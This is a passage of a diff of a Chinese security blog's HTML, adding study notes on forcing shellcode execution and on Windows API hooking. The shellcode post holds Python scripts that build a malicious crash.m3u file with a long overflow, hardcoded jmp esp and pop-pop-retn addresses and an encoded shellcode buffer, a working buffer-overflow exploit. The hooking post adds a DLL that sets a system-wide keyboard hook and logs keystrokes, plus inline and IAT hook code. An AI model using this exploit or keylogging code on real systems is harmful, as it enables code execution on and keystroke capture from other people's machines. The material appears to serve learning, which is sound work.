class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">popad 0x61</span><br><span class="line">pop eax 58</span><br><span class="line">pop ebx 5b</span><br><span class="line">pop ecx 59</span><br><span class="line">pop edx 5a</span><br><span class="line">pop esi 5e</span><br><span class="line">pop ebp 5d</span><br><span class="line">retn    C3</span><br><span class="line"></span><br><span class="line">python 脚本</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x5C\xDF\x80\x7C&quot; ) #eip pop pop retn</span><br><span class="line">    f.write(&quot;\x90&quot; *4 ) #retn4</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; * 6)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x31\xae\x80\x7c&quot; ) #eip jmp esp</span><br><span class="line">    f.write(&quot;\x90&quot; * 25) #必须 如果确实这些会shellcode会执行错误</span><br><span class="line">    buf = &quot;&quot;</span><br><span class="line">    buf += &quot;\x89\xe7\xdd\xc1\xd9\x77\xf4\x5e\x56\x59\x49\x49\x49&quot;</span><br><span class="line">    buf += &quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span><br><span class="line">    buf += &quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span><br><span class="line">    buf += &quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span><br><span class="line">    buf += &quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span><br><span class="line">    buf += &quot;\x4a\x49\x58\x59\x4a\x4b\x4d\x4b\x38\x59\x34\x34\x36&quot;</span><br><span class="line">    buf += &quot;\x44\x4b\x44\x30\x31\x39\x42\x4f\x42\x33\x47\x46\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x49\x33\x54\x4c\x4b\x32\x51\x56\x50\x4c\x4b\x52&quot;</span><br><span class="line">    buf += &quot;\x56\x34\x4c\x4c\x4b\x33\x46\x55\x4c\x4c\x4b\x37\x36&quot;</span><br><span class="line">    buf += &quot;\x53\x38\x4c\x4b\x53\x4e\x47\x50\x4c\x4b\x46\x56\x46&quot;</span><br><span class="line">    buf += &quot;\x58\x50\x4f\x45\x48\x44\x35\x4c\x33\x46\x39\x45\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x51\x4b\x4f\x4b\x51\x55\x30\x4c\x4b\x42\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x34\x4c\x4b\x37\x35\x47\x4c\x4c\x4b\x56\x34&quot;</span><br><span class="line">    buf += &quot;\x36\x48\x32\x58\x35\x51\x4b\x5a\x4c\x4b\x30\x4a\x45&quot;</span><br><span class="line">    buf += &quot;\x48\x4c\x4b\x51\x4a\x51\x30\x55\x51\x4a\x4b\x5a\x43&quot;</span><br><span class="line">    buf += &quot;\x30\x34\x30\x49\x4c\x4b\x46\x54\x4c\x4b\x35\x51\x4a&quot;</span><br><span class="line">    buf += &quot;\x4e\x46\x51\x4b\x4f\x50\x31\x4f\x30\x4b\x4c\x4e\x4c&quot;</span><br><span class="line">    buf += &quot;\x4d\x54\x39\x50\x52\x54\x33\x37\x49\x51\x38\x4f\x44&quot;</span><br><span class="line">    buf += &quot;\x4d\x35\x51\x49\x57\x5a\x4b\x4c\x34\x57\x4b\x43\x4c&quot;</span><br><span class="line">    buf += &quot;\x31\x34\x47\x58\x32\x55\x4d\x31\x4c\x4b\x30\x5a\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x53\x31\x4a\x4b\x42\x46\x4c\x4b\x54\x4c\x30\x4b&quot;</span><br><span class="line">    buf += &quot;\x4c\x4b\x50\x5a\x35\x4c\x53\x31\x5a\x4b\x4c\x4b\x35&quot;</span><br><span class="line">    buf += &quot;\x54\x4c\x4b\x35\x51\x4b\x58\x4d\x59\x30\x44\x51\x34&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x45\x31\x49\x53\x48\x32\x43\x38\x47\x59\x49&quot;</span><br><span class="line">    buf += &quot;\x44\x4d\x59\x4d\x35\x4c\x49\x59\x52\x33\x58\x4c\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x4e\x54\x4e\x4a\x4c\x51\x42\x4d\x38\x4d\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x4b\x4f\x4c\x49\x50\x45\x34\x44\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x43\x4e\x49\x48\x4d\x32\x52\x53\x4c\x47\x45\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x42\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f&quot;</span><br><span class="line">    buf += &quot;\x4b\x39\x30\x45\x34\x48\x32\x48\x52\x4c\x32\x4c\x51&quot;</span><br><span class="line">    buf += &quot;\x30\x51\x51\x45\x38\x57\x43\x36\x52\x46\x4e\x33\x54&quot;</span><br><span class="line">    buf += &quot;\x35\x38\x32\x55\x34\x33\x43\x55\x34\x32\x46\x50\x49&quot;</span><br><span class="line">    buf += &quot;\x4b\x4c\x48\x31\x4c\x46\x44\x55\x5a\x4b\x39\x4d\x36&quot;</span><br><span class="line">    buf += &quot;\x50\x56\x4b\x4f\x46\x35\x54\x44\x4c\x49\x58\x42\x50&quot;</span><br><span class="line">    buf += &quot;\x50\x4f\x4b\x49\x38\x39\x32\x50\x4d\x4f\x4c\x4c\x47&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x57\x54\x46\x32\x4a\x48\x51\x4f\x4b\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x35\x38\x42\x4f\x43\x48\x56\x38\x57\x50&quot;</span><br><span class="line">    buf += &quot;\x45\x38\x43\x51\x42\x47\x45\x35\x31\x52\x35\x38\x30&quot;</span><br><span class="line">    buf += &quot;\x4d\x43\x55\x54\x33\x43\x43\x50\x31\x59\x4b\x4b\x38&quot;</span><br><span class="line">    buf += &quot;\x51\x4c\x36\x44\x35\x5a\x4c\x49\x5a\x43\x53\x58\x30&quot;</span><br><span class="line">    buf += &quot;\x58\x37\x50\x51\x30\x51\x30\x52\x48\x50\x4d\x36\x33&quot;</span><br><span class="line">    buf += &quot;\x51\x56\x31\x31\x35\x38\x53\x42\x42\x4f\x52\x4d\x47&quot;</span><br><span class="line">    buf += &quot;\x50\x35\x38\x42\x4f\x46\x4c\x47\x50\x45\x36\x45\x38&quot;</span><br><span class="line">    buf += &quot;\x57\x38\x42\x45\x32\x4c\x42\x4c\x50\x31\x58\x49\x4c&quot;</span><br><span class="line">    buf += &quot;\x48\x50\x4c\x57\x54\x34\x50\x4c\x49\x4d\x31\x50\x31&quot;</span><br><span class="line">    buf += &quot;\x38\x52\x36\x32\x56\x33\x56\x31\x46\x32\x4b\x4f\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x36\x51\x49\x50\x36\x30\x4b\x4f\x50\x55\x53\x38&quot;</span><br><span class="line">    buf += &quot;\x41\x41&quot;</span><br><span class="line">    f.write(buf)</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>+checkGS 特征<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#函数开头</span><br><span class="line">mov eax,__security_cookie</span><br><span class="line">xor eax,ebp</span><br><span class="line">mov [ebp-4],eax</span><br><span class="line"></span><br><span class="line">#函数结尾</span><br><span class="line">mov ecx,[ebp-4]</span><br><span class="line">xor ecx,ebp</span><br><span class="line">call check_函数</span><br></pre></td></tr></table></figure></p>
+<p>当缓冲区起始于栈顶下方时,可以使用一系列的POP指令和RET指令,来使字节弹出zhan,ESP指针越来越接近shellcode,当最后执行RET会将shellcode地址压入EIP</p>
 <ul>
-<li>checkESP<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.cmp ebp,esp</span><br><span class="line">  call xxx</span><br><span class="line">2.call内部是jnz xxx</span><br><span class="line">3.一般在函数结束时,call调用完之后出现</span><br></pre></td></tr></table></figure>
+<li><p>push return</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">push esp 54</span><br><span class="line">retn     C3</span><br><span class="line"></span><br><span class="line">当寄存器指向shellcode,但是没有jump Reg/call Reg,则可以通过push Reg</span><br><span class="line">retn</span><br><span class="line">由于retn会将Reg的内容压入Eip</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x5C\xDF\x80\x7C&quot; ) #pop pop retn</span><br><span class="line">    f.write(&quot;\x90&quot; *4 ) #retn4</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; * 6)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x72\x1E\x81\x7c&quot; ) #eip push esp retn</span><br></pre></td></tr></table></figure>
 </li>
+<li><p>jmp [reg + offset]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">寄存器指向包含shellcode地址的缓冲区,但是没有指向入口,通过指向</span><br><span class="line">jmp [Reg+offset]跳转到入口</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SHE<br>通过自己的地址去覆盖SHE,迫使跳转至shellcode,但是需要处理safeShe以及SHEOP</p>
+</li>
+<li><p>应对狭窄型缓冲区<br>利用跳转指令跳至任意地址</p>
+</li>
+<li><p>short jumps/conditional jumps</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp short 0xeb</span><br><span class="line"></span><br><span class="line">条件跳转:</span><br><span class="line">根据EFLAGS寄存器的状态来实现跳转</span><br></pre></td></tr></table></figure></li>
 </ul>
-<blockquote>
-<p>VS编译器生成C++类代码特色</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#对于类</span><br><span class="line">1.this指针,VS编辑器会使用ECX来作为this指针传参</span><br><span class="line"></span><br><span class="line">#构造函数</span><br><span class="line">1.使用ECX传this</span><br><span class="line">2.call内部对ECX指向缓冲区进行赋值或者初始化</span><br><span class="line">3.返回值EAX是this指针</span><br><span class="line">例如:</span><br><span class="line">push ecx</span><br><span class="line">lea edi,[ebp+xx]</span><br><span class="line">mov ecx,xx/4</span><br><span class="line">mov eax,0CCCCCCCCh</span><br><span class="line">rep stosd</span><br><span class="line">pop ecx</span><br><span class="line">mov [ebp+this],ecx ;this指针放入局部变量</span><br><span class="line">xxxxxxx</span><br><span class="line">mov eax,[ebp+this]</span><br><span class="line"></span><br><span class="line">#成员函数</span><br><span class="line">1.使用ECX传this</span><br><span class="line">2.call内部对ECX指向缓冲区进行赋值或者初始化</span><br><span class="line"></span><br><span class="line">#析构函数</span><br><span class="line">#构造函数</span><br><span class="line">1.使用ECX传this</span><br><span class="line">2.call内部对ECX指向缓冲区进行访问或者释放</span><br><span class="line">3.局部对象一般调用在函数退出时</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>VS程序内存和编译的一些特征</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.内存值特点</span><br><span class="line">  FDFDFDFD 堆的边界,也作为堆标记</span><br><span class="line">  CDCDCDCD 堆申请空间未初始化状态 new-&gt;malloc-&gt;HeapAlloc-&gt;RtAllocHeap</span><br><span class="line">  CCCCCCCC 局部堆栈未初始化状态</span><br><span class="line">  40300000 浮点数(IEEE浮点表示法)</span><br><span class="line">  3D9B5DC1 不像地址不像数据认为是hash值</span><br><span class="line">  00380000 VirtualAlloc申请的内存地址(页对齐)</span><br><span class="line">  FEFEFEFE 堆释放之后的填充信息</span><br><span class="line">  0012FF8C 堆栈地址一般比较小</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>vs2015/2017 全局变量</p>
-</blockquote>
-<p>_initterm 循环调用全局对象构造函数 可以用来写反调试<br>initterm.cpp 假如在调用全局对象时,通过eip跳过调用,来测试是否有反调试<br>8B 4D F8 8B 11 89 55 F4 8B 4D F4 FF 15 ?? ?? ?? ?? FF 55 F4</p>
 
       
 
@@ -870,7 +780,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
         		</li>
       		
 		</ul>
@@ -880,7 +790,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/逆向基础03/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/迫使shellcode执行方法/">展开全文 >></a>
         </p>
       
 
@@ -965,6 +875,101 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/08/20/PE文件数据结构/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-Hook原理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/Hook原理/">HooK原理</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/Hook原理/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>万能神奇Hook:<br>1.系统提供的消息Hook机制<br>2.自定义的Hook汇编技巧</p>
+<blockquote>
+<p>消息钩子例子</p>
+</blockquote>
+<p>1.SetWindowsHookEx设置钩子<br>2.CallNextHookEx为钩子链的下一个程序设置钩子<br>3.UnhookWindowsHookEx卸载钩子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">HHOOK g_Hook;</span><br><span class="line">HMODULE g_hModule;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK KeyboardProc(</span><br><span class="line">	int code,           // 消息类型</span><br><span class="line">	WPARAM wParam,      // 虚拟码</span><br><span class="line">	LPARAM lParam) &#123;    // 按键信息</span><br><span class="line"></span><br><span class="line">	// 判断是否wParam与lParam都有键盘消息，是的话则执行打印操作</span><br><span class="line">	if (code == HC_ACTION)&#123;</span><br><span class="line">		// 将256个虚拟键的状态拷贝到指定的缓冲区中，如果成功则继续</span><br><span class="line">		BYTE KeyState[256] = &#123; 0 &#125;;</span><br><span class="line">		if (GetKeyboardState(KeyState)) &#123;</span><br><span class="line">			// 得到第16–23位，键盘虚拟码</span><br><span class="line">			LONG  KeyInfo = lParam;</span><br><span class="line">			UINT  keyCode = (KeyInfo &gt;&gt; 16) &amp; 0x00ff;</span><br><span class="line">			WCHAR wKeyCode = 0;</span><br><span class="line">			ToAscii((UINT)wParam, keyCode, KeyState, (LPWORD)&amp;wKeyCode, 0);</span><br><span class="line">			// 将其打印出来</span><br><span class="line">			WCHAR szInfo[512] = &#123; 0 &#125;;</span><br><span class="line">			swprintf_s(szInfo, 512, L&quot;Hook_%c&quot;, (char)wKeyCode);</span><br><span class="line">			OutputDebugString(szInfo);</span><br><span class="line">			return 0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return CallNextHookEx(g_Hook, code, wParam, lParam);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL InstallHook() &#123;</span><br><span class="line">	g_Hook = SetWindowsHookEx(</span><br><span class="line">		WH_KEYBOARD,//按键消息的钩子</span><br><span class="line">		KeyboardProc, //回调函数</span><br><span class="line">		g_hModule,</span><br><span class="line">		0);</span><br><span class="line"></span><br><span class="line">	if (NULL == g_Hook)</span><br><span class="line">		return FALSE;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">// 导出函数：卸载钩子</span><br><span class="line">BOOL UninstallHook() &#123;</span><br><span class="line">	if (NULL == g_Hook)</span><br><span class="line">		return FALSE;</span><br><span class="line">	return UnhookWindowsHookEx(g_Hook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">					 )</span><br><span class="line">&#123;</span><br><span class="line">	switch (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	case DLL_PROCESS_ATTACH:</span><br><span class="line">		g_hModule = hModule;</span><br><span class="line">		InstallHook();</span><br><span class="line"></span><br><span class="line">		break;</span><br><span class="line">// 	case DLL_THREAD_ATTACH:</span><br><span class="line">// 	case DLL_THREAD_DETACH:</span><br><span class="line">	case DLL_PROCESS_DETACH:</span><br><span class="line">		//UninstallHook();</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>自定义钩子</p>
+</blockquote>
+<ul>
+<li><p>内联Hook<br>通过修改Opcode 使原本跳转到原函数的地址变成跳转到制定函数的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void UnHook();</span><br><span class="line">void OnHook();</span><br><span class="line">BYTE g_old[5];</span><br><span class="line">BYTE g_New[5] = &#123;0xE9&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int</span><br><span class="line">WINAPI</span><br><span class="line">MyMessageBoxW(</span><br><span class="line">_In_opt_ HWND hWnd,</span><br><span class="line">_In_opt_ LPCWSTR lpText,</span><br><span class="line">_In_opt_ LPCWSTR lpCaption,</span><br><span class="line">_In_ UINT uType)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	lpText = L&quot;你被HOOK了&quot;;</span><br><span class="line">	lpCaption = L&quot;HOOK&quot;;</span><br><span class="line">	//卸载钩子</span><br><span class="line">	UnHook();</span><br><span class="line">	int nRet = MessageBoxW(hWnd, lpText, lpCaption, uType);</span><br><span class="line">	//安装钩子</span><br><span class="line">	OnHook();</span><br><span class="line">	return nRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void OnHook()</span><br><span class="line">&#123;</span><br><span class="line">	//获取MessageBoxW地址</span><br><span class="line">	DWORD dwMsg = (DWORD)MessageBoxW;</span><br><span class="line">	DWORD dwMyMsg = (DWORD)MyMessageBoxW;</span><br><span class="line">	//计算偏移 offset = 目标地址 - jmp所在地址 - 指令长度</span><br><span class="line">	DWORD dwOffset = dwMyMsg - dwMsg - 5;</span><br><span class="line"></span><br><span class="line">	//保存原来的Opcode</span><br><span class="line">	memcpy(g_old, MessageBoxW, 5);</span><br><span class="line">	//构造Hook地址</span><br><span class="line">	*(DWORD*)(g_New + 1) = dwOffset;</span><br><span class="line">	//修改地址</span><br><span class="line">	DWORD dwOld;</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">	memcpy(MessageBoxW,g_New,  5);</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line">void UnHook()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwOld;</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">	memcpy(MessageBoxW, g_old, 5);</span><br><span class="line">	VirtualProtect(MessageBoxW, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	OnHook();</span><br><span class="line">	MessageBox(0,0,0,0);</span><br><span class="line">	UnHook();</span><br><span class="line">	MessageBox(0, 0, 0, 0);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>IATHook<br>1.通过导入表查询到制定的函数名<br>2.根据函数名制定函数地址<br>3.替换函数地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int 